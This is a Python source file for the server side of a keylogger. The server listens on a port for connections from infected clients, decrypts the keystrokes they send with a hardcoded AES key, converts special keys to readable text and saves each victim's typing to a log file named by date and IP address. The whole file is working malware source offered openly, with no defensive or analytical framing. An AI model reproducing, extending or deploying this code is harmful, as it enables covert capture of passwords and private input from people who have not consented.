""" Keylogger server side - stores and encrypts keystrokes on remote computer """
import socket
from datetime import datetime
import os
import time
import threading
from queue import Queue
from utilities.general_encrypt import AES_256_decrypt as aesdec

NUM_OF_THREADS = 2
JOB_INDEX = [1, 2]
queue = Queue()
KEY = 'oS4HVRozu-OhydzhLPwV2GwQ4iseTzQkS-W-_SjNwy0=' #Altais :$
CURRENT_LOG_FILE = ''

################### NETWORK FUNCTIONS #########################

def create_socket():
    """ cretes a socket with client """
    try:
        global HOST
        global PORT
        global SOCK
        HOST = ""
        PORT = 8975 #YK
        SOCK = socket.socket()
        print("Socket created.")
    except socket.error as error_msg:
        print("Socket creation error: " + str(error_msg))

def bind_socket():
    """ binds host and port together and listens for connections """
    try:
        global HOST
        global PORT
        global SOCK

        print("Binding to Port: " + str(PORT))
        SOCK.bind((HOST, PORT))
        SOCK.listen(5)
    except socket.error as error_msg:
        print("Socket binding error..." + str(error_msg))
        bind_socket()

def socket_accept():
    """ Establish connection with client - socket must be listening """
    global SOCK

    conn, ip_add = SOCK.accept()
    print("\nConnection has been established: | IP: " + ip_add[0] + " | Port: " + str(ip_add[1]))

    try:
        curr_date = datetime.now().strftime("%Y-%m-%d")
        log_keystrokes_v2(conn, curr_date, str(ip_add[0]))
    except KeyboardInterrupt or BrokenPipeError:
        pass

    conn.close
    print("\nConnection closed.")

########################## KEY FUNCTIONS ###########################################

def parse(character):
    """ Trims keystroke to a more readable format """

    blanks = ["Key.up", "Key.down", "Key.left", "Key.right", "Key.caps_lock",
              "Key.delete", 'Key.shift_r', "Key.shift_l", "Key.shift"]

    character = character.replace("'", "")

    if len(character) == 1:
        pass
    elif character in blanks:
        character = ""
    elif character == "Key.space":
        character = " "
    elif character == "Key.enter":
        character = "\n"
    elif character == "Key.ctrl_l" or character == "Key.ctrl_r" or character == "Key.ctrl":
        character = "^"
    elif character == "Key.backspace":
        character = "-"
    elif character == "Key.tab":
        character = "(tab)"
    elif character == "Key.esc":
        character = "(esc)"
    elif character == "Key.alt" or character == "key.alt_l" or character == "key.alt_r":
        character = "alt+"

    return character

def log_keystrokes_v2(conn, day, ip_address):
    """ creates log file and begins network decrypt and write """
    global KEY
    global CURRENT_LOG_FILE

    # Timer start
    start_time = float(format(time.time(), '.2f'))

    # Creation and initialization of log file
    bits = conn.recv(1024)
    headerinfo = bits.decode('utf-8')
    log_name = f'./logs/LOG-{day}-{ip_address}.txt'
    write_mode = 'a'
    if not os.path.isfile(log_name):
        write_mode = 'w'
    with open(log_name, write_mode) as log:
        log.write(headerinfo + '\t\tIP: ' + ip_address + '\n\n')
    CURRENT_LOG_FILE = log_name

    #                                                       Network Loop
    while True:
        try:
            bits = conn.recv(1024)                          # 1 - Recieve bits
            decrypted_bits = aesdec(bits, KEY)              # 2 - Decrypt bits
            keystroke = decrypted_bits.decode('utf-8')      # 3 - Decode bits
            keystroke = parse(keystroke)                    # 4 - Parse bits
            open(log_name, 'a').write(keystroke)            # 5 - Write bits

        except ValueError: # If null bits (client dies) then encryption function throws exception
            print('Connection lost. Client process most likely killed.')
            elapsed_time = format(float(format(time.time(), '.2f')) - start_time, '.2f')
            open(log_name, 'a').write(
                f'\n Connection lost.\n Elapsed time: {elapsed_time} seconds.\n\n')
            break
        except KeyboardInterrupt:
            print('Connection lost due to KeyboardInterrupt.')
            elapsed_time = format(float(format(time.time(), '.2f')) - start_time, '.2f')
            open(log_name, 'a').write(
                f'\n Connection closed.\n Elapsed time: {elapsed_time} seconds.\n\n')
            break

def write_ascii():
    """ writes a nice ascii artwork of the title """
    print("                                                       /$$   /$$              ")
    print("                                                      |__/  | $$              ")
    print(" /$$$$$$/$$$$   /$$$$$$   /$$$$$$$  /$$$$$$  /$$   /$$ /$$ /$$$$$$    /$$$$$$ ")
    print("| $$_  $$_  $$ /$$__  $$ /$$_____/ /$$__  $$| $$  | $$| $$|_  $$_/   /$$__  $$")
    print("| $$ \ $$ \ $$| $$  \ $$|  $$$$$$ | $$  \ $$| $$  | $$| $$  | $$    | $$  \ $$")
    print("| $$ | $$ | $$| $$  | $$ \____  $$| $$  | $$| $$  | $$| $$  | $$ /$$| $$  | $$")
    print("| $$ | $$ | $$|  $$$$$$/ /$$$$$$$/|  $$$$$$$|  $$$$$$/| $$  |  $$$$/|  $$$$$$/")
    print("|__/ |__/ |__/ \______/ |_______/  \____  $$ \______/ |__/   \___/   \______/ ")
    print("                                        | $$                                  ")
    print("                                        | $$                                  ")
    print("                                        |__/                                  ")

##################### Thread and queue functions ################################

def empty_queue():
    """ sorts jobs for threads to accept
        sockets or start main terminal """

    while True:
        job_q = queue.get()
        if job_q == 1:
            while True:
                try:
                    socket_accept()
                except KeyboardInterrupt:
                    print('Shutting down...')
        if job_q == 2:
            main()

    queue.task_done()

def create_jobs():
    """ takes jobs and indexes them into queue """
    for job_q in JOB_INDEX:
        queue.put(job_q)
    queue.join()

def create_threads():
    """ creates threads and starts each with daemon """
    for _ in range(NUM_OF_THREADS):
        thr = threading.Thread(target=empty_queue)
        thr.daemon = True
        thr.start()

############ MAIN - second thread idk ##############

def main():
    """ main """
    write_ascii()
    while True:
        pass
    print('shutting down main.')

################## Initialization #################

try:
    create_socket()
    bind_socket()
    create_threads()
    create_jobs()
except KeyboardInterrupt:
    print("\nKeyboard Interrupt: Shutting down server.\nAny active connections have been killed.")
except FileNotFoundError:
    print("\nSome files missing. Shutting down.")
